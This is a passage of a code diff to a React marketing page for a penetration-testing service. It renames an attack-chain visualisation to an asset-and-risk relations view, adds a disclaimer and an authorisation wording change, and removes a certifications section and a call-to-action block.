+                    <div style={{ display: 'flex', flexWrap: 'nowrap', gap: 8, marginBottom: 30, overflowX: 'auto', paddingBottom: 4 }}>
                       {item.tags.map(t => (
-                        <span key={t} style={{ fontSize: 12, padding: '6px 14px', borderRadius: 20, background: item.color + '10', color: item.color, border: `1px solid ${item.color}25`, fontWeight: 600 }}>{t}</span>
+                        <span key={t} style={{ fontSize: 12, padding: '6px 14px', borderRadius: 20, background: item.color + '10', color: item.color, border: `1px solid ${item.color}25`, fontWeight: 600, whiteSpace: 'nowrap', flexShrink: 0 }}>{t}</span>
                       ))}
                     </div>
                   </div>
@@ -745,23 +743,23 @@ export function PenetrationTest() {
         </div>
       </section>
 
-      {/* ══ 3. ATTACK CHAIN — light background ═════════════════════ */}
+      {/* ══ 3. ASSET / SERVICE / RISK RELATIONS ════════════════════ */}
       <ScrollReveal>
-        <section style={{ background: 'linear-gradient(135deg,#f1f5f9,#e2e8f0)', padding: '88px 0', borderTop: '1px solid #e2e8f0', borderBottom: '1px solid #e2e8f0' }}>
+        <section id="pt-relations" style={{ background: 'linear-gradient(135deg,#f1f5f9,#e2e8f0)', padding: '88px 0', borderTop: '1px solid #e2e8f0', borderBottom: '1px solid #e2e8f0' }}>
           <div style={{ maxWidth: 1200, margin: '0 auto', padding: '0 48px' }}>
             <div style={{ textAlign: 'center', marginBottom: 56 }}>
-              <p style={{ fontSize: 12, fontWeight: 700, color: '#ef4444', textTransform: 'uppercase', letterSpacing: '0.12em', margin: '0 0 10px' }}>攻击链路可视化</p>
+              <p style={{ fontSize: 12, fontWeight: 700, color: '#ef4444', textTransform: 'uppercase', letterSpacing: '0.12em', margin: '0 0 10px' }}>测试信息关联展示</p>
               <h2 style={{ fontSize: 'clamp(26px,3.2vw,40px)', fontWeight: 900, color: '#0f172a', margin: '0 0 12px', lineHeight: 1.15 }}>
-                全攻击链可视，让安全风险看得见
+                关联展示资产、服务和已发现风险
               </h2>
               <p style={{ fontSize: 15, color: '#64748b', maxWidth: 520, margin: '0 auto' }}>
-                基于 MITRE ATT&CK 框架，模拟真实 APT 攻击路径，悬停查看各阶段详细技术手段
+                从授权目标出发，关联资产发现、服务识别和风险记录，辅助查看测试对象与发现项之间的关系
               </p>
             </div>
 
             {/* Chain */}
             <div style={{ display: 'flex', alignItems: 'stretch', gap: 4, marginBottom: 24 }}>
-              {ATTACK_PHASES.map((phase, i) => {
+              {RELATION_STAGES.map((phase, i) => {
                 const Icon = phase.icon;
                 const isHov = hoveredPhase === phase.id;
                 return (
@@ -790,10 +788,10 @@ export function PenetrationTest() {
                         ))}
                       </div>
                     </motion.div>
-                    {i < ATTACK_PHASES.length - 1 && (
+                    {i < RELATION_STAGES.length - 1 && (
                       <div style={{ display: 'flex', alignItems: 'center', paddingBottom: 8 }}>
                         <motion.div animate={{ x: [0, 4, 0] }} transition={{ duration: 1.5, repeat: Infinity }}
-                          style={{ color: ATTACK_PHASES[i + 1].color, opacity: 0.5 }}>
+                          style={{ color: RELATION_STAGES[i + 1].color, opacity: 0.5 }}>
                           <ChevronRight size={18} />
                         </motion.div>
                       </div>
@@ -809,11 +807,11 @@ export function PenetrationTest() {
                 <motion.div key={hoveredPhase} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}
                   style={{ background: '#fff', border: '1px solid #e2e8f0', borderRadius: 16, padding: '24px 28px', boxShadow: '0 4px 20px rgba(0,0,0,0.06)' }}>
                   {(() => {
-                    const phase = ATTACK_PHASES.find(p => p.id === hoveredPhase)!;
+                    const phase = RELATION_STAGES.find(p => p.id === hoveredPhase)!;
                     return (
                       <div>
                         <div style={{ fontSize: 12, fontWeight: 700, color: phase.color, textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 16 }}>
-                          {phase.label} 阶段 · 技术手段详情
+                          {phase.label} · 关联信息详情
                         </div>
                         <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: 14 }}>
                           {phase.techniques.map(t => (
@@ -832,11 +830,14 @@ export function PenetrationTest() {
                   style={{ textAlign: 'center', padding: '18px 0' }}>
                   <p style={{ fontSize: 13, color: '#94a3b8', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8 }}>
                     <Radar size={14} style={{ color: '#ef4444' }} />
-                    将鼠标悬停在任意阶段卡片上，查看该阶段使用的具体攻击技术
+                    将鼠标悬停在任意卡片上，查看对应的关联信息
                   </p>
                 </motion.div>
               )}
             </AnimatePresence>
+            <div style={{ marginTop: 10, padding: '11px 16px', borderRadius: 10, background: 'rgba(255,255,255,0.72)', border: '1px solid #cbd5e1', color: '#64748b', fontSize: 12.5, lineHeight: 1.65, textAlign: 'center' }}>
+              当前为信息关联结构示意，不代表具体项目结果。授权案例的路径数量、影响范围与项目时间仅在完成客户授权、脱敏并可核验后展示，且案例结果不代表所有项目。
+            </div>
           </div>
         </section>
       </ScrollReveal>
@@ -900,17 +901,17 @@ export function PenetrationTest() {
             <div style={{ textAlign: 'center', marginBottom: 56 }}>
               <p style={{ fontSize: 12, fontWeight: 700, color: '#ef4444', textTransform: 'uppercase', letterSpacing: '0.12em', margin: '0 0 10px' }}>标准化服务流程</p>
               <h2 style={{ fontSize: 'clamp(26px,3.2vw,38px)', fontWeight: 900, color: '#0f172a', margin: 0 }}>
-                五步闭环，合规高效交付
+                五步服务流程，明确授权与交付边界
               </h2>
             </div>
             <div style={{ position: 'relative' }}>
-              <div style={{ position: 'absolute', left: 28, top: 40, bottom: 40, width: 2, background: 'linear-gradient(to bottom,#6366f1,#3b82f6,#f59e0b,#ef4444,#10b981)', borderRadius: 1, opacity: 0.2 }} />
+              <div style={{ position: 'absolute', left: 28, top: 28, bottom: 28, width: 4, transform: 'translateX(-50%)', background: 'linear-gradient(to bottom,#6366f1,#3b82f6,#f59e0b,#ef4444,#10b981)', borderRadius: 4, boxShadow: '0 0 0 5px rgba(99,102,241,0.06)' }} />
               <div style={{ display: 'flex', flexDirection: 'column', gap: 20 }}>
                 {SERVICE_STEPS.map(s => {
                   const Icon = s.icon;
                   return (
                     <div key={s.step} style={{ display: 'flex', gap: 20, alignItems: 'flex-start' }}>
-                      <div style={{ width: 56, height: 56, borderRadius: '50%', background: `${s.color}14`, border: `2px solid ${s.color}35`, display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, position: 'relative', zIndex: 1 }}>
+                      <div style={{ width: 56, height: 56, borderRadius: '50%', background: '#fff', border: `3px solid ${s.color}`, display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, position: 'relative', zIndex: 1, boxShadow: `0 6px 18px ${s.color}26` }}>
                         <Icon style={{ width: 22, height: 22, color: s.color }} />
                       </div>
                       <div style={{ flex: 1, background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: 14, padding: '18px 22px', marginTop: 6 }}>
@@ -928,59 +929,6 @@ export function PenetrationTest() {
           </div>
         </section>
       </ScrollReveal>
-
-      {/* ══ 6. CREDENTIALS — light background ══════════════════════ */}
-      <ScrollReveal>
-        <section style={{ background: 'linear-gradient(135deg,#f8fafc,#f1f5f9)', padding: '72px 0', borderTop: '1px solid #e2e8f0' }}>
-          <div style={{ maxWidth: 1200, margin: '0 auto', padding: '0 48px', textAlign: 'center' }}>
-            <p style={{ fontSize: 12, fontWeight: 700, color: '#ef4444', textTransform: 'uppercase', letterSpacing: '0.12em', margin: '0 0 10px' }}>资质与信任背书</p>
-            <h2 style={{ fontSize: 'clamp(24px,2.8vw,34px)', fontWeight: 900, color: '#0f172a', margin: '0 0 8px' }}>
-              国家级漏洞库技术支撑单位，合规无忧
-            </h2>
-            <p style={{ fontSize: 14, color: '#64748b', margin: '0 0 48px' }}>
-              CCRC 一级资质 · CNCVE 成员 · ISO 27001 认证，所有测试均有完整合法授权书
-            </p>
-            <div style={{ display: 'flex', gap: 16, justifyContent: 'center', flexWrap: 'wrap' }}>
-              {CREDENTIALS.map(c => {
-                const Icon = c.icon;
-                return (
-                  <div key={c.label} style={{ background: '#fff', border: `1.5px solid ${c.color}22`, borderRadius: 16, padding: '22px 28px', minWidth: 140, textAlign: 'center', boxShadow: `0 4px 16px ${c.color}08` }}>
-                    <div style={{ width: 44, height: 44, borderRadius: 12, background: `${c.color}12`, display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 12px' }}>
-                      <Icon style={{ width: 22, height: 22, color: c.color }} />
-                    </div>
-                    <div style={{ fontSize: 16, fontWeight: 800, color: '#0f172a', marginBottom: 4 }}>{c.label}</div>
-                    <div style={{ fontSize: 11, color: '#64748b', lineHeight: 1.5 }}>{c.sub}</div>
-                  </div>
-                );
-              })}
-            </div>
-          </div>
-        </section>
-      </ScrollReveal>
-
-      {/* ══ CTA — 立即发现您系统的安全隐患 ════════════════════════ */}
-      <section id="pt-cta" style={{ background: 'linear-gradient(135deg,#fef2f2,#fff7ed)', padding: '72px 48px', textAlign: 'center', borderTop: '1px solid #fee2e2' }}>
-        <div style={{ maxWidth: 640, margin: '0 auto' }}>
-          <h2 style={{ fontSize: 32, fontWeight: 900, color: '#0f172a', margin: '0 0 12px' }}>
-            立即发现您系统的安全隐患
-          </h2>
-          <p style={{ fontSize: 15, color: '#64748b', margin: '0 0 32px', lineHeight: 1.7 }}>
-            首次合作提供免费初步侦察报告（资产发现 + 风险摘要），无需任何前期费用。预约专家 1 对 1 为您定制渗透测试方案。
-          </p>
-          <div style={{ display: 'flex', gap: 14, justifyContent: 'center', flexWrap: 'wrap' }}>
-            <button
-              onClick={() => setShowBooking(true)}
-              style={{ display: 'inline-flex', alignItems: 'center', gap: 8, padding: '14px 32px', background: 'linear-gradient(135deg,#ef4444,#f97316)', color: '#fff', border: 'none', borderRadius: 12, fontSize: 15, fontWeight: 700, cursor: 'pointer', boxShadow: '0 6px 24px rgba(239,68,68,0.38)' }}>
-              <Calendar size={17} /> 立即开始
-            </button>
-            <button
-              onClick={() => { window.scrollTo(0, 0); navigate('/help-docs'); }}
-              style={{ display: 'inline-flex', alignItems: 'center', gap: 8, padding: '14px 26px', background: '#fff', color: '#374151', border: '1.5px solid #e2e8f0', borderRadius: 12, fontSize: 15, fontWeight: 600, cursor: 'pointer' }}>
-              <BookOpen size={17} /> 查看服务说明
-            </button>
-          </div>
-        </div>
-      </section>
 
     </div>
   );
